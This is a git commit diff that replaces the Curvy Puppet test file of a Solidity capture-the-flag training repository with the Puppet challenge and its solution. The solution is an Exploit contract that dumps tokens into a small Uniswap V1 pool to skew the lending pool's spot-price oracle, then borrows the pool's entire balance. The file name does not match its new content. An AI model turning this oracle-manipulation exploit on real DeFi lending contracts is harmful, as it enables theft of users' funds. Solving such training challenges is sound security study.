ff62821ab453672147e4d97868c0967185724415
Srishti <rathisrishti@gmail.com>
2026-04-06 19:21:54 +0530

    Complete all Solution

--- test/curvy-puppet/CurvyPuppet.t.sol
+++ test/curvy-puppet/CurvyPuppet.t.sol
@@ -3,42 +3,27 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {IPermit2} from "permit2/interfaces/IPermit2.sol";
-import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
-import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
-import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
+import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
+import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
+import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
-contract CurvyPuppetChallenge is Test {
+contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
-    address player = makeAddr("player");
-    address treasury = makeAddr("treasury");
+    address recovery = makeAddr("recovery");
+    address player;
+    uint256 playerPrivateKey;
 
-    // Users' accounts
-    address alice = makeAddr("alice");
-    address bob = makeAddr("bob");
-    address charlie = makeAddr("charlie");
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
+    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
 
-    address constant ETH = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);
-
-    // Relevant Ethereum mainnet addresses
-    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
-    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
-    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
-    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-
-    uint256 constant TREASURY_WETH_BALANCE = 200e18;
-    uint256 constant TREASURY_LP_BALANCE = 65e17;
-    uint256 constant LENDER_INITIAL_LP_BALANCE = 1000e18;
-    uint256 constant USER_INITIAL_COLLATERAL_BALANCE = 2500e18;
-    uint256 constant USER_BORROW_AMOUNT = 1e18;
-    uint256 constant ETHER_PRICE = 4000e18;
-    uint256 constant DVT_PRICE = 10e18;
-
-    DamnValuableToken dvt;
-    CurvyPuppetLending lending;
-    CurvyPuppetOracle oracle;
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    IUniswapV1Factory uniswapV1Factory;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -51,136 +36,122 @@ contract CurvyPuppetChallenge is Test {
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
     function setUp() public {
-        // Fork from mainnet state at specific block
-        vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 20190356);
+        (player, playerPrivateKey) = makeAddrAndKey("player");
 
         startHoax(deployer);
 
-        // Deploy DVT token (collateral asset in the lending contract)
-        dvt = new DamnValuableToken();
+        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
-        // Deploy price oracle and set prices for ETH and DVT
-        oracle = new CurvyPuppetOracle();
-        oracle.setPrice({asset: ETH, value: ETHER_PRICE, expiration: block.timestamp + 1 days});
-        oracle.setPrice({asset: address(dvt), value: DVT_PRICE, expiration: block.timestamp + 1 days});
+        // Deploy a exchange that will be used as the factory template
+        IUniswapV1Exchange uniswapV1ExchangeTemplate =
+            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
 
-        // Deploy the lending contract. It will offer LP tokens, accepting DVT as collateral.
-        lending = new CurvyPuppetLending({
-            _collateralAsset: address(dvt),
-            _curvePool: curvePool,
-            _permit2: permit2,
-            _oracle: oracle
-        });
+        // Deploy factory, initializing it with the address of the template exchange
+        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
+        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
 
-        // Fund treasury account with WETH and approve player's expenses
-        deal(address(weth), treasury, TREASURY_WETH_BALANCE);
+        // Deploy token to be traded in Uniswap V1
+        token = new DamnValuableToken();
 
-        // Fund lending pool and treasury with initial LP tokens
-        vm.startPrank(0x4F48031B0EF8acCea3052Af00A3279fbA31b50D8); // impersonating mainnet LP token holder to simplify setup (:
-        IERC20(curvePool.lp_token()).transfer(address(lending), LENDER_INITIAL_LP_BALANCE);
-        IERC20(curvePool.lp_token()).transfer(treasury, TREASURY_LP_BALANCE);
+        // Create a new exchange for the token
+        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));
 
-        // Treasury approves assets to player
-        vm.startPrank(treasury);
-        weth.approve(player, TREASURY_WETH_BALANCE);
-        IERC20(curvePool.lp_token()).approve(player, TREASURY_LP_BALANCE);
+        // Deploy the lending pool
+        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));
 
-        // Users open 3 positions in the lending contract
-        address[3] memory users = [alice, bob, charlie];
-        for (uint256 i = 0; i < users.length; i++) {
-            // Fund user with some collateral
-            vm.startPrank(deployer);
-            dvt.transfer(users[i], USER_INITIAL_COLLATERAL_BALANCE);
-            // User deposits + borrows from lending contract
-            _openPositionFor(users[i]);
-        }
-    }
+        // Add initial token and ETH liquidity to the pool
+        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
+        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
+            0, // min_liquidity
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            block.timestamp * 2 // deadline
+        );
 
-    /**
-     * Utility function used during setup of challenge to open users' positions in the lending contract
-     */
-    function _openPositionFor(address who) private {
-        vm.startPrank(who);
-        // Approve and deposit collateral
-        address collateralAsset = lending.collateralAsset();
-        // Allow permit2 handle token transfers
-        IERC20(collateralAsset).approve(address(permit2), type(uint256).max);
-        // Allow lending contract to pull collateral
-        permit2.approve({
-            token: lending.collateralAsset(),
-            spender: address(lending),
-            amount: uint160(USER_INITIAL_COLLATERAL_BALANCE),
-            expiration: uint48(block.timestamp)
-        });
-        // Deposit collateral + borrow
-        lending.deposit(USER_INITIAL_COLLATERAL_BALANCE);
-        lending.borrow(USER_BORROW_AMOUNT);
+        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
+        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
     }
 
     /**
      * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
      */
-    function test_assertInitialState() public view {
-        // Player balances
-        assertEq(dvt.balanceOf(player), 0);
-        assertEq(stETH.balanceOf(player), 0);
-        assertEq(weth.balanceOf(player), 0);
-        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0);
-
-        // Treasury balances
-        assertEq(dvt.balanceOf(treasury), 0);
-        assertEq(stETH.balanceOf(treasury), 0);
-        assertEq(weth.balanceOf(treasury), TREASURY_WETH_BALANCE);
-        assertEq(IERC20(curvePool.lp_token()).balanceOf(treasury), TREASURY_LP_BALANCE);
-
-        // Curve pool trades the expected assets
-        assertEq(curvePool.coins(0), ETH);
-        assertEq(curvePool.coins(1), address(stETH));
-
-        // Correct collateral and borrow assets in lending contract
-        assertEq(lending.collateralAsset(), address(dvt));
-        assertEq(lending.borrowAsset(), curvePool.lp_token());
-
-        // Users opened position in the lending contract
-        address[3] memory users = [alice, bob, charlie];
-        for (uint256 i = 0; i < users.length; i++) {
-            uint256 collateralAmount = lending.getCollateralAmount(users[i]);
-            uint256 borrowAmount = lending.getBorrowAmount(users[i]);
-            assertEq(collateralAmount, USER_INITIAL_COLLATERAL_BALANCE);
-            assertEq(borrowAmount, USER_BORROW_AMOUNT);
-
-            // User is sufficiently collateralized
-            assertGt(lending.getCollateralValue(collateralAmount) / lending.getBorrowValue(borrowAmount), 3);
-        }
+    function test_assertInitialState() public {
+        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
+        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
+        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
+        assertEq(
+            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
+            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
+        );
+        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
+        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
     }
 
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_curvyPuppet() public checkSolvedByPlayer {
-        
+    function test_puppet() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit{value:PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            recovery
+        );
+        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
+        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+    // Utility function to calculate Uniswap prices
+    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
+        private
+        pure
+        returns (uint256)
+    {
+        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
-        // All users' positions are closed
-        address[3] memory users = [alice, bob, charlie];
-        for (uint256 i = 0; i < users.length; i++) {
-            assertEq(lending.getCollateralAmount(users[i]), 0, "User position still has collateral assets");
-            assertEq(lending.getBorrowAmount(users[i]), 0, "User position still has borrowed assets");
-        }
+        // Player executed a single transaction
+        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
-        // Treasury still has funds left
-        assertGt(weth.balanceOf(treasury), 0, "Treasury doesn't have any WETH");
-        assertGt(IERC20(curvePool.lp_token()).balanceOf(treasury), 0, "Treasury doesn't have any LP tokens left");
-        assertEq(dvt.balanceOf(treasury), USER_INITIAL_COLLATERAL_BALANCE * 3, "Treasury doesn't have the users' DVT");
+        // All tokens of the lending pool were deposited into the recovery account
+        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
+        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
 
-        // Player has nothing
-        assertEq(dvt.balanceOf(player), 0, "Player still has DVT");
-        assertEq(stETH.balanceOf(player), 0, "Player still has stETH");
-        assertEq(weth.balanceOf(player), 0, "Player still has WETH");
-        assertEq(IERC20(curvePool.lp_token()).balanceOf(player), 0, "Player still has LP tokens");
+contract Exploit {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange,
+        address _recovery 
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+    function attack(uint exploitAmount) public {
+        uint tokenBalance = token.balanceOf(address(this));
+        token.approve(address(uniswapV1Exchange), tokenBalance);
+        console.log("before calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
+        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
+        console.log(token.balanceOf(address(uniswapV1Exchange)));
+        console.log("after calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
+        lendingPool.borrow{value: 20e18}(
+            exploitAmount,
+            recovery
+        );
+    }
+    receive() external payable {
     }
 }
